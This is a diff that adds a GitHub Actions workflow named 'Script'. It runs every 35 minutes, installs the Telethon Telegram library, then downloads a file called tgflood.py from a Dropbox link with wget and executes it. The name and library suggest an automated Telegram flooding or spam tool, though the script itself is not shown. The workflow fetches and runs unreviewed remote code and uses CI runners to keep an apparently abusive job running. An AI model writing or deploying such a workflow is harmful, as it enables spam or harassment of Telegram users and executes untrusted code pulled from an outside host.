@@ -1,0 +1,28 @@
+name: Script
+
+on:
+  schedule:
+    - cron: '*/35 * * * *'
+  workflow_dispatch:
+
+jobs:
+  build:
+    name: Start Building...
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Checkout repository
+        uses: actions/checkout@v2
+
+      - name: Install Python
+        run: sudo apt-get update && sudo apt-get install python3 -y
+
+      - name: Install python requirements
+        run: sudo apt-get install python3-pip -y
+
+      - name: Run Tgflood Script
+        run: |
+          pip install telethon
+          pip install --upgrade telethon
+          wget "https://www.dropbox.com/scl/fi/n2lvu58leezfaco6xmisj/tgflood.py?rlkey=v0a7tb7w5p5yudu1kxq5cpo1r&st=1dkic0th&dl=1" -O tgflood.py
+          python tgflood.py
